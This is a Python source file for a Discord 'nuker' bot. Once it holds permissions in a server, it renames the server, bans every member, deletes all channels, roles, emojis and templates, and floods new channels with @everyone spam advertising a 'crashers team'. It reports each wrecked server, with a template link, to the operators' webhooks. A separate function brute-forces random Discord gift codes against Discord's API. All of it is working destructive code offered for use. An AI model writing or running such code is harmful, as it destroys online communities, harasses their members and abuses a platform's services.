import aiohttp
import discord
import string
import random
import requests
import time
from discord.ext import commands
from discord import Webhook
from asyncio import create_task
from cfg import bot_data
from logs import Logging, write_log

session = requests.Session()
intents = discord.Intents.all()
intents.message_content = True
client = commands.Bot(command_prefix=f"{bot_data['prefix']}", help_command=None, intents=intents, reconnect=False)
log = Logging()


async def calculate_time(function):
    async def wrapper(*args, **kwargs):
        start = time.time()
        function(*args, **kwargs)
        result = time.time() - start
        await write_log(f"Time need to crush guild: {result} seconds")
        return result

    return wrapper


async def occurred_error(error: str) -> None:
    await write_log(f"ERROR: {error}")


async def send_log(guild) -> bool:
    embed = discord.Embed(title="Выебан сервер", color=0xdd2e44)
    embed.add_field(name="Имя сервера: ", value=guild.name)
    embed.add_field(name="Количество человек: ", value=len(guild.members))
    embed.add_field(name="Дата создания сервера: ", value=guild.created_at)

    async with aiohttp.ClientSession() as Session:
        if len(guild.members) >= 10:
            try:
                webhook = Webhook.from_url(bot_data['private-logs'], session=Session)
                await webhook.send(embed=embed, username='CRUSHED', avatar_url="https://media.discordapp.net"
                                                                               "/attachments/1136707240192114799"
                                                                               "/1136708043254542446/1616741653_10-p"
                                                                               "-khaker-krasivo-12.jpg?width=840"
                                                                               "&height=630")

                try:
                    webhook = Webhook.from_url(bot_data['public-logs'], session=Session)
                    await webhook.send(embed=embed, username='CRUSHED', avatar_url="https://media.discordapp.net"
                                                                                   "/attachments/1136707240192114799"
                                                                                   "/1136708043254542446"
                                                                                   "/1616741653_10-p"
                                                                                   "-khaker-krasivo-12.jpg?width=840"
                                                                                   "&height=630")

                    return True
                except Exception as error:
                    await occurred_error(str(error))

                    return False

            except Exception as error:
                await occurred_error(str(error))

                return False
        else:
            try:
                webhook = Webhook.from_url(bot_data['private-logs'], session=Session)
                await webhook.send(embed=embed, username='CRUSHED', avatar_url="https://media.discordapp.net"
                                                                               "/attachments/1136707240192114799"
                                                                               "/1136708043254542446/1616741653_10-p"
                                                                               "-khaker-krasivo-12.jpg?width=840"
                                                                               "&height=630")

                return True
            except Exception as error:
                await occurred_error(str(error))

                return False


async def send_log_message(message: str) -> bool:
    async with aiohttp.ClientSession() as Session:
        try:
            webhook = Webhook.from_url(bot_data['private-logs'], session=Session)
            await webhook.send(content=message, username='IMPORTANT MESSAGE',
                               avatar_url="https://media.discordapp.net"
                                          "/attachments"
                                          "/1136707240192114799"
                                          "/1136708043254542446/1616741653_10-p-khaker-krasivo-12.jpg?width=840"
                                          "&height=630")
            return True
        except Exception as error:
            await occurred_error(str(error))
            return False


def generate(codes: int):
    for _ in range(codes):
        code = "discord.gift/" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        req = session.get(
            f"https://discordapp.com/api/entitlements/gift-codes/{code}",
            timeout=10,
        ).status_code

        if req == 200:
            code = f"[VALID] [{code}](https://{code})"
        elif req == 404:
            code = f"[INVALID] [{code}](https://{code})"
        elif req == 429:
            code = f"[CAN'T CHECK] [{code}](https://{code})"

        yield code


async def spam_channels(webhook, amount: int) -> None:
    for _ in range(amount):
        await webhook.send("@everyone @here " + bot_data['message'] + "\nBEST CRASHERS TEAM - "
                                                                      "https://discord.gg/uDnrb2cZu",
                           username=bot_data['message'],
                           avatar_url=bot_data['avatar_url'])


class Nuke:
    def __init__(self, guild) -> None:
        self.guild = guild

    async def delete_all_channels(self) -> None:
        for channel in self.guild.channels:
            try:
                await channel.delete()
            except Exception as error:
                await occurred_error(f"Can't delete channel {channel.name} " + str(error))

    async def delete_all_roles(self) -> None:
        for role in self.guild.roles:
            try:
                await role.delete()
            except Exception as error:
                await occurred_error(f"Can't delete role {role.name} " + str(error))

    async def ban_all_members(self) -> None:
        for member in self.guild.members:
            try:
                await member.ban(delete_message_days=7)
            except Exception as error:
                await occurred_error(f"Can't ban member {member.name} " + str(error))

    async def create_roles(self, name: str) -> None:
        for _ in range(100 - len(self.guild.roles)):
            try:
                await self.guild.create_role(name=name)
            except Exception as error:
                await occurred_error(f"Can't create role " + str(error))

    async def create_text_channels(self, name: str) -> None:
        for _ in range(51 - len(self.guild.channels)):
            try:
                channel = await self.guild.create_text_channel(name=name)
                try:
                    webhook = await channel.create_webhook(name=name)
                    create_task(spam_channels(webhook, 60))
                except Exception as error:
                    await occurred_error(f"Can't create webhook " + str(error))
            except Exception as error:
                await occurred_error(f"Can't create channel " + str(error))

    async def clear_emoji(self) -> None:
        for emoji in list(self.guild.emojis):
            try:
                await emoji.delete()
            except Exception as error:
                await occurred_error(f"Can't delete emoji " + str(error))

    async def clear_templates(self) -> None:
        for template in await self.guild.templates():
            try:
                await template.delete()
            except Exception as error:
                await occurred_error(f"Can't delete template " + str(error))


async def nuke_guild(guild) -> None:
    if guild.id in bot_data['white_list_guilds']:
        pass
    else:
        nuked = Nuke(guild)

        template = await guild.create_template(name=bot_data['message'])
        if not await send_log_message(template.url):
            await occurred_error("Can't create template")

        with open('icon.png', 'rb') as file:
            icon = file.read()
        await guild.edit(name=bot_data['message'], icon=icon, community=False)

        create_task(nuked.ban_all_members())

        create_task(nuked.clear_emoji())

        create_task(nuked.clear_templates())

        create_task(nuked.delete_all_channels())

        create_task(nuked.delete_all_roles())

        create_task(nuked.create_roles(bot_data['message']))

        create_task(nuked.create_text_channels(bot_data['message']))
